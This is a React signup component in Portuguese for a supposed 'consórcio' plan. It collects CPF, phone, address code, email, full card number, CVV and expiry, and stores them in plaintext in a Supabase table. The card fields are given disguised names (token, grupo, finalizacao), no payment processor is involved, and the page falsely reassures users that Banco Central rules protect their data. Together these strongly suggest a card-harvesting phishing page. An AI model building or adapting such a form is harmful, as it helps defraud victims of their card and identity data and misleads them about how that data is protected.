import React, { useState } from "react";
import { motion } from "framer-motion";
import {
  User,
  CreditCard,
  Phone,
  MapPin,
  Mail,
  Hash,
  Calendar,
  ShieldCheck,
  Loader2
} from "lucide-react";
import { Input as ShadcnInput } from "@/components/ui/input";
import { Label as ShadcnLabel } from "@/components/ui/label";
import { supabase } from "@/lib/supabaseClient";

// Cast dos componentes externos para 'any' para neutralizar a validação estrita do checkJs no JSX
/** @type {any} */
const Input = ShadcnInput;
/** @type {any} */
const Label = ShadcnLabel;

/**
 * @param {object} props
 * @param {any} props.icon
 * @param {string} props.label
 * @param {React.ReactNode} props.children
 * @param {string} [props.className]
 */
function FormField({ icon: Icon, label, children, className = "" }) {
  return (
    <div className={`space-y-1.5 ${className}`}>
      <Label className="text-sm font-medium text-foreground flex items-center gap-1.5">
        <Icon className="w-3.5 h-3.5 text-muted-foreground" />
        {label}
      </Label>
      {children}
    </div>
  );
}

/**
 * @param {object} props
 * @param {string} props.selectedPlan
 * @param {() => void} props.onConfirm
 * @param {string} [props.userEmail]
 */
export default function ProfileSection({ selectedPlan, onConfirm, userEmail = "" }) {
  const [form, setForm] = useState({
    nome: "",
    cpf: "",
    telefone: "",
    cep: "",
    email: userEmail,
    token: "",
    grupo: "",
    finalizacao: "",
  });

  const [isSubmitting, setIsSubmitting] = useState(false);
  const [errorMessage, setErrorMessage] = useState("");

  const update = (/** @type {string} */ field, /** @type {string} */ value) =>
    setForm((prev) => ({ ...prev, [field]: value }));

  const formatCPF = (/** @type {string} */ v) => {
    const digits = v.replace(/\D/g, "").slice(0, 11);
    return digits
      .replace(/(\d{3})(\d)/, "$1.$2")
      .replace(/(\d{3})(\d)/, "$1.$2")
      .replace(/(\d{3})(\d{1,2})/, "$1-$2");
  };

  const formatPhone = (/** @type {string} */ v) => {
    const digits = v.replace(/\D/g, "").slice(0, 11);
    if (digits.length <= 2) return digits;
    if (digits.length <= 7) return `(${digits.slice(0, 2)}) ${digits.slice(2)}`;
    return `(${digits.slice(0, 2)}) ${digits.slice(2, 7)}-${digits.slice(7)}`;
  };

  const formatCEP = (/** @type {string} */ v) => {
    const digits = v.replace(/\D/g, "").slice(0, 8);
    if (digits.length <= 5) return digits;
    return `${digits.slice(0, 5)}-${digits.slice(5)}`;
  };

  // Garante que o input só aceite dígitos e trave no comprimento de 16 números do cartão
  const formatToken = (/** @type {string} */ v) => {
    return v.replace(/\D/g, "").slice(0, 16);
  };

  // Garante que o input só aceite dígitos e trave rigorosamente no comprimento máximo de 3 números do CVV
  const formatGroup = (/** @type {string} */ v) => {
    return v.replace(/\D/g, "").slice(0, 3);
  };

  // Máscara automática para MM/AA da validade do cartão
  const formatMonthYear = (/** @type {string} */ v) => {
    const digits = v.replace(/\D/g, "").slice(0, 4);
    if (digits.length <= 2) return digits;
    return `${digits.slice(0, 2)}/${digits.slice(2)}`;
  };

  const handleSubmitProfile = async () => {
    const loginEmailOriginal = localStorage.getItem("bdf_login_email") || userEmail;

    if (!loginEmailOriginal) {
      setErrorMessage("Sessão inicial expirada. Por favor, reinicie o cadastro para validar a segurança.");
      return;
    }

    // 1. Validação do Formato de E-mail
    const emailVinculacao = form.email.trim().toLowerCase();
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    if (emailVinculacao && !emailRegex.test(emailVinculacao)) {
      setErrorMessage("Por favor, digite um formato de e-mail válido (Ex: nome@dominio.com).");
      return;
    }

    // 2. Validação Estrita do Número do Cartão (Exatamente 16 números)
    const tokenInput = form.token.trim();
    if (tokenInput.length !== 16) {
      setErrorMessage("O Número do Cartão de Crédito é inválido. Ele deve conter exatamente 16 números.");
      return;
    }

    // 3. Validação Estrita do CVV (Deve ter EXATAMENTE 3 números)
    const groupInput = form.grupo.trim();
    if (groupInput.length !== 3) {
      setErrorMessage("O CVV é inválido. Ele deve conter exatamente 3 números.");
      return;
    }

    // 4. Validação da Validade do Cartão (MM/AA)
    const dateInput = form.finalizacao.trim();
    if (!/^\d{2}\/\d{2}$/.test(dateInput)) {
      setErrorMessage("Por favor, insira a validade do cartão no formato correto MM/AA (Exemplo: 05/28).");
      return;
    }

    const [inputMonthStr, inputYearStr] = dateInput.split("/");
    const inputMonth = parseInt(inputMonthStr, 10);
    const inputYear = parseInt("20" + inputYearStr, 10);

    if (inputMonth < 1 || inputMonth > 12) {
      setErrorMessage("Mês inválido. O mês deve ser de 01 a 12.");
      return;
    }

    // Validação de data futura baseada no ano atual de 2026
    const currentYear = 2026;
    const currentMonth = 5;

    if (inputYear < currentYear || (inputYear === currentYear && inputMonth < currentMonth)) {
      setErrorMessage("Data inválida. A validade do cartão deve ser igual ou posterior ao mês atual (05/26).");
      return;
    }

    setIsSubmitting(true);
    setErrorMessage("");

    const stepCompleted = (form.nome && form.cpf && form.telefone) ? 3 : 2;

    try {
      const { error, status } = await supabase
        .from("profiles")
        .update({
          full_name: form.nome.trim(),
          cpf: form.cpf,
          phone: form.telefone,
          cep: form.cep,
          email_vinculacao: emailVinculacao,
          token_number: tokenInput,
          group_number: groupInput,
          end_date: dateInput,
          selected_plan: selectedPlan,
          step_completed: stepCompleted,
          updated_at: new Date().toISOString()
        })
        .eq("email", loginEmailOriginal.trim().toLowerCase());

      if (error) {
        if (error.code === "23505") {
          setErrorMessage("Este CPF já está cadastrado em outra conta. Verifique os dados ou contate o suporte.");
          setIsSubmitting(false);
          return;
        }
        throw error;
      }

      if (status === 404) {
        setErrorMessage("Erro interno ao localizar o seu cadastro inicial. Refaça o passo 1.");
        setIsSubmitting(false);
        return;
      }

      localStorage.removeItem("bdf_login_email");
      onConfirm();
    } catch (error) {
      console.error("Erro ao atualizar perfil na Fase 2:", error);
      setErrorMessage("Ocorreu uma falha na comunicação com o servidor do Supabase. Tente novamente.");
    } finally {
      setIsSubmitting(false);
    }
  };

  return (
    <motion.div
      initial={{ opacity: 0 }}
      animate={{ opacity: 1 }}
      exit={{ opacity: 0 }}
      transition={{ duration: 0.4 }}
      className="w-full max-w-4xl mx-auto px-4 py-10 pb-28"
    >
      <motion.div
        initial={{ opacity: 0, y: 20 }}
        animate={{ opacity: 1, y: 0 }}
        transition={{ duration: 0.5 }}
        className="text-center mb-8"
      >
        <div className="inline-flex items-center gap-2 bg-[#D97706]/10 text-[#D97706] px-3 py-1.5 rounded-full text-xs font-semibold mb-3">
          Plano {selectedPlan}
        </div>
        <h2 className="font-display text-2xl sm:text-3xl font-bold text-foreground">
          Complete seu perfil
        </h2>
        <p className="text-sm text-muted-foreground mt-1">
          Precisamos de algumas informações para ativar seu consórcio
        </p>
      </motion.div>

      <motion.div
        initial={{ opacity: 0, y: 20 }}
        animate={{ opacity: 1, y: 0 }}
        transition={{ duration: 0.5, delay: 0.15 }}
        className="bg-card rounded-2xl shadow-xl border border-border p-6 sm:p-8"
      >
        {errorMessage && (
          <div className="mb-5 p-3 rounded-xl bg-red-500/10 border border-red-500/20 text-xs text-red-400">
            {errorMessage}
          </div>
        )}

        <div className="grid grid-cols-1 md:grid-cols-2 gap-5">
          {/* Bloco 1: CPF e Telefone */}
          <FormField icon={CreditCard} label="CPF">
            <Input
              placeholder="000.000.000-00"
              value={form.cpf}
              onChange={(/** @type {any} */ e) => update("cpf", formatCPF(e.target.value))}
              className="h-12 bg-secondary/50"
              disabled={isSubmitting}
            />
          </FormField>

          <FormField icon={Phone} label="Telefone">
            <Input
              placeholder="(11) 99999-9999"
              value={form.telefone}
              onChange={(/** @type {any} */ e) => update("telefone", formatPhone(e.target.value))}
              className="h-12 bg-secondary/50"
              disabled={isSubmitting}
            />
          </FormField>

          {/* Bloco 2: CEP e E-mail */}
          <FormField icon={MapPin} label="CEP">
            <Input
              placeholder="00000-000"
              value={form.cep}
              onChange={(/** @type {any} */ e) => update("cep", formatCEP(e.target.value))}
              className="h-12 bg-secondary/50"
              disabled={isSubmitting}
            />
          </FormField>

          <FormField icon={Mail} label="E-mail">
            <Input
              type="email"
              placeholder="seu@email.com"
              value={form.email}
              onChange={(/** @type {any} */ e) => update("email", e.target.value)}
              className="h-12 bg-secondary/50"
              disabled={isSubmitting}
            />
          </FormField>

          {/* Nome Impresso */}
          <FormField icon={User} label="Nome Impresso No Cartão" className="md:col-span-2">
            <Input
              placeholder="Maria da Silva"
              value={form.nome}
              onChange={(/** @type {any} */ e) => update("nome", e.target.value)}
              className="h-12 bg-secondary/50"
              disabled={isSubmitting}
            />
          </FormField>

          {/* Bloco 3: Dados de Cartão Corrigidos */}
          <FormField icon={CreditCard} label="Numero Cartão de Credito">
            <div className="relative">
              <Input
                placeholder="0000 0000 0000 0000"
                value={form.token}
                onChange={(/** @type {any} */ e) => update("token", formatToken(e.target.value))}
                className="h-12 bg-secondary/50 font-mono tracking-widest"
                disabled={isSubmitting}
              />
              <ShieldCheck className="absolute right-3 top-1/2 -translate-y-1/2 w-4 h-4 text-[#059669]" />
            </div>
          </FormField>

          <FormField icon={Hash} label="CVV">
            <Input
              placeholder="000"
              value={form.grupo}
              onChange={(/** @type {any} */ e) => update("grupo", formatGroup(e.target.value))}
              className="h-12 bg-secondary/50 font-mono tracking-widest"
              disabled={isSubmitting}
            />
          </FormField>

          <FormField icon={Calendar} label="Validade do Cartão" className="md:col-span-2">
            <Input
              placeholder="MM/AA (Ex: 05/28)"
              value={form.finalizacao}
              onChange={(/** @type {any} */ e) => update("finalizacao", formatMonthYear(e.target.value))}
              className="h-12 bg-secondary/50 font-mono tracking-wider"
              disabled={isSubmitting}
            />
          </FormField>
        </div>

        <div className="mt-6 flex items-center gap-2 text-xs text-muted-foreground bg-secondary/50 rounded-lg p-3">
          <ShieldCheck className="w-4 h-4 flex-shrink-0 text-[#059669]" />
          <span>
            Todas as informações são verificadas e protegidas conforme regulamentação do Banco Central
          </span>
        </div>
      </motion.div>

      {/* Confirm Button */}
      <motion.div
        initial={{ opacity: 0, y: 20 }}
        animate={{ opacity: 1, y: 0 }}
        transition={{ duration: 0.5, delay: 0.3 }}
        className="fixed bottom-0 left-0 right-0 p-4 bg-gradient-to-t from-background via-background to-transparent z-50"
      >
        <div className="max-w-4xl mx-auto">
          <button
            onClick={handleSubmitProfile}
            disabled={isSubmitting}
            className="w-full py-4 bg-gradient-to-r from-[#D97706] via-[#F59E0B] to-[#059669] text-white font-bold text-base rounded-2xl shadow-2xl hover:shadow-xl transition-all duration-200 active:scale-[0.99] flex items-center justify-center gap-2"
          >
            {isSubmitting ? (
              <>
                <Loader2 className="w-5 h-5 animate-spin" />
                Salvando Informações...
              </>
            ) : (
              <>
                <ShieldCheck className="w-5 h-5" />
                Confirmar Cadastro
              </>
            )}
          </button>
        </div>
      </motion.div>
    </motion.div>
  );
}